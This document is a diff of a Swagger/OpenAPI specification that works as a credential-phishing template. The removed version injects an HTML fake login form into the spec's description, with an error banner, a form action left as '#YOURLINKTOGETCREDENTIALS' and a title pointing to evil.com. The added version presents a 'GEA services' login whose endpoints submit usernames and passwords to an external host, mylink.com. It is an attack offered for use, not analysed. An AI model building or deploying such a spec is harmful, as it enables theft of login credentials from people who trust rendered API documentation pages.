@@ -1,76 +1,75 @@
-swagger: '2.0'
+openapi: 3.0.0
 info:
-  version: 1.0.0
-  title: Login API go to https://evil.com
-  description: |
-    <div class="login-form">
-      <!-- Error Message -->
-      <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-        <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-          <svg style="width: 22px; height: 22px; fill: #721c24; margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" id="error">
-            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0-2A5 5 0 1 0 8 3a5 5 0 0 0 0 10zm0-9a1 1 0 0 1 1 1v3a1 1 0 1 1-2 0V5a1 1 0 0 1 1-1zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"></path>
-          </svg>
-          <strong>An error occurred while loading, please log in.</strong>
-        </div>
-      </div>
+  title: Login Page
+  description: Error, Click on authorize to login to GEA services
+  version: 0.0.0
 
-      <!-- Login Form -->
-      <div class="heading">
-        <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
-        <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-          <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
-            <div class="form-group" style="margin-bottom: 15px;">
-              <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
-              <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-            </div>
-            <div class="form-group" style="margin-bottom: 15px;">
-              <label for="password" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Password</label>
-              <input type="password" name="password" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-            </div>
-            <div class="form-group" style="margin-top: 20px;">
-              <button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; transition: background-color 0.3s;">Login</button>
-            </div>
-          </form>
-        </div>
-      </div>
+components:
+  securitySchemes:
+    Gea_Login:
+      type: http
+      scheme: basic
 
-      <!-- Footer with your name -->
-      <div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
-        Rivek Raj Tamang (Rivudon)
-      </div>
-    </div>
-  paths:
-    /login:
-      post:
-        summary: Login endpoint to authenticate users
-        description: This endpoint allows users to login by providing username and password.
-        consumes:
-          - application/x-www-form-urlencoded
-        parameters:
-          - name: username
-            in: formData
-            description: The username for login
-            required: true
-            type: string
-          - name: password
-            in: formData
-            description: The password for login
-            required: true
-            type: string
-        responses:
-          '200':
-            description: Login successful
+paths:
+  /Login:
+    post:
+      summary: Login to GEA services by submitting credentials to an external service.
+      description: Please log in to access the services. Your credentials will be submitted to https://mylink.com.
+      security:
+        - Gea_Login: [] # Require Basic Auth
+      responses:
+        "200":
+          description: Successfully logged in and authenticated.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                    example: "Login successful"
+                  user:
+                    type: string
+                    example: "John Doe"
+        "401":
+          description: Unauthorized access. Invalid credentials.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  error:
+                    type: string
+                    example: "Invalid username or password"
+        "400":
+          description: Bad request, missing credentials or invalid format.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  error:
+                    type: string
+                    example: "Missing credentials"
+
+  /submit-credentials:
+    post:
+      summary: Submit credentials to external service.
+      description: This endpoint will send the credentials to https://mylink.com for verification.
+      requestBody:
+        content:
+          application/json:
             schema:
               type: object
               properties:
-                message:
+                username:
                   type: string
-                  example: "Login successful"
-          '400':
-            description: Invalid credentials or missing fields
-            schema:
-              type: object
-              properties:
-                error:
+                  example: "user123"
+                password:
                   type: string
-                  example: "Invalid username or password"
+                  example: "securePassword"
+      responses:
+        "200":
+          description: Successfully submitted credentials to external service.
+        "400":
+          description: Invalid credentials or missing fields.
